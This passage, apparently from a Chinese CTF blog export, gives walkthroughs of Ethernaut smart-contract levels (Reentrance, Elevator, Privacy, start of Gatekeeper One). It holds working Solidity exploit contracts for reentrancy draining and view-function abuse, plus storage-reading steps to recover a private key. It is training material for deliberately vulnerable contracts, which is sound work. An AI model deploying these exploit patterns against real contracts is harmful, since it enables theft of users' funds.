balances; function donate(address _to) public payable &#123; balances[_to] += msg.value; &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; if(msg.sender.call.value(_amount)()) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; function() public payable &#123;&#125;&#125;contract exp &#123; address instance_address = 0xdc8941b8396a3140b008d124fcd149acd2005eff; Reentrance target = Reentrance(instance_address); function exp() payable&#123;&#125; function donate() public payable &#123; target.donate.value(msg.value)(this); &#125; function attack() public &#123; //这题有bug，不会自己回调fallback函数，要你写两次withdraw才可以 target.withdraw(0.5 ether); target.withdraw(0.5 ether); &#125; function get_balance() public view returns(uint) &#123; return target.balanceOf(this); &#125; function my_eth_bal() public view returns(uint) &#123; return address(this).balance; &#125; function ins_eth_bal() public view returns(uint) &#123; return instance_address.balance; &#125; function () public payable &#123; //同理写两次 target.withdraw(0.5 ether); target.withdraw(0.5 ether); &#125;&#125; 2.调用donate方法捐款2ETH 3.调用attack方法进行攻击，可以看见钱全部在我们这里并且整数溢出了 攻击后的结果 4.点击submit instance即可过关。 通关后的彩蛋 Use transfer to move funds out of your contract, since it throws and limits gas forwarded. Low level functions like call and send just return false but don’t interrupt the execution flow when the receiving contract fails.Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.Re-entrancy is a common attack. You should always be prepared for it! The DAO HackThe famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack. level 11- Elevator题目链接 胜利条件1.将top设为true tips1.有时solidity语言不能保持诺言.2.Elevator可以被Building利用. 源码123456789101112131415161718192021pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125; 预备知识1.view关键字可以大概查看这篇文章了解一下 解题思路1.第一个方法是在我们自己设置的合约里面设置一个变量为true，每次调用isLastFloor函数的时候将该变量取反并返回。这是可行的，因为： 当前 Solidity 编译器没有强制执行视图函数（view function）或常量函数（constant function）不能修改状态。而且也没有强制纯函数（pure function）不读取状态信息。所以声明一个 view 和 pure 函数，并不保证就不修改数据状态。 2.第二个方法是我们每次调用isLastFloor函数的时候通过判断gas的奇偶来返回true or flase,一定概率下是可以碰撞成功的 具体步骤1.编写exp合约a.第一种方法123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125;contract exp &#123; address instance_address = 0x71e4e8947b9755da6b649e6ce86394e6a4e796bf; Elevator e = Elevator(instance_address); bool public isLast = true; function isLastFloor(uint) public returns (bool) &#123; isLast = ! isLast; return isLast; &#125; function attack() public &#123; e.goTo(100); &#125;&#125; b.第二种方法123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;interface Building &#123; function isLastFloor(uint) view public returns (bool);&#125;contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125;&#125;contract exp &#123; address instance_address = 0x71e4e8947b9755da6b649e6ce86394e6a4e796bf; Elevator e = Elevator(instance_address); function isLastFloor(uint) public returns (bool) &#123; return (gasleft())%2==0; #低版本可以使用msg.gas &#125; function attack() public &#123; e.goTo(100); &#125;&#125; 2.调用attack()方法3.点击submit instance即可过关。 通关后的彩蛋 Currently, the Solidity compiler does nothing to enforce that a view or constant function is not modifying state. The same applies to pure functions, which should not read state but they can. Make sure you read Solidity’s documentation and learn its caveats.An alternative way to solve this level is to build a view function which returns different results depends on input data but don’t modify state, e.g. gasleft(). level 12- Privacy题目链接 胜利条件1.调用unlock函数将locked设为false tips1.了解storage,parameter parsing和casting是如何工作的2.使用remix或使用自己搭载的web3提供程序 源码123456789101112131415161718192021222324252627282930pragma solidity ^0.4.18;contract Privacy &#123; bool public locked = true; uint256 public constant ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(now); bytes32[3] private data; function Privacy(bytes32[3] _data) public &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */&#125; 预备知识1.如何读取合约的storage web3.eth.getStorageAt(contract.address, 0, function(x, y) {alert(y)}); //其中0可以换成1，2，32.变量存储规则根据 Solidity 优化规则，当变量所占空间小于 32 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。constant常量是无需存储的 解题思路1.通过读取storage得到一系列数据并找出data[2]提交到unlock函数解锁 具体步骤1.读取合约的storage123450x0000000000000000000000000000000000000000000000000000007b3ff0a010x79a1ed4c7ba7bbe11d264f4ee6c1d980fe0e5087e9baf770a19f7fe605dcd4340xbbd5d1cf216d04652f128560551961bdb24c58cd4a50182a6ff2c19b0e1e5e060xd83aa7d5f6da7a858cc7a3646ab832ab7a7429a433c98cca8bb859436d8ad5e20x0000000000000000000000000000000000000000000000000000000000000000 2.进行分析除了ID常量不用存储，其他的常量分别如下：a.bool public locked = true 占 1 字节 -&gt; 01b.uint8 private flattening = 10 占 1 字节 -&gt; 0ac.uint8 private denomination = 255 占 1 字节 -&gt; ffd.uint16 private awkwardness = uint16(now) 占 2 字节 -&gt; 07b3刚好也就对应storage中的第一行最后的07b3ff0a01,则data[2]就应该是第四行的数据,由于是byte16，则提交前16个字节就行，也就是d83aa7d5f6da7a858cc7a3646ab832ab 3.将data[2]提交到unlock函数里 await contract.unlock(web3.toAscii(‘d83aa7d5f6da7a858cc7a3646ab832ab’)) 4.点击submit instance即可过关。 通关后的彩蛋 level 13- Gatekeeper One题目链接 胜利条件1.通过gatekeeper并注册成为entrant tips1.前面的Telephone和Token关卡学到的东西很有用2.您可以在Solidity的文档中了解有关msg.gas特殊变量或其首选别名gasleft()的更多信息（请参阅这个和此处）。 源码12345678910111213141516171819202122232425262728pragma solidity ^0.4.18;contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(msg.gas % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(_gateKey) == uint16(_gateKey)); require(uint32(_gateKey) != uint64(_gateKey)); require(uint32(_gateKey) == uint16(tx.origin)); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125;]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F01%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Start这个博客主要用来记录一些有关ctf的知识因为自己太健忘了，不记录下会出事的而且搭个博客以后AWD就不用再坐着发呆了，起码有点东西可以看本博客主要分为web和crypto两个方向，也是我现在负责的两个方向希望自己多多加油吧！最后来个常规操作 1$ ehco "Hello world"]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
</search>
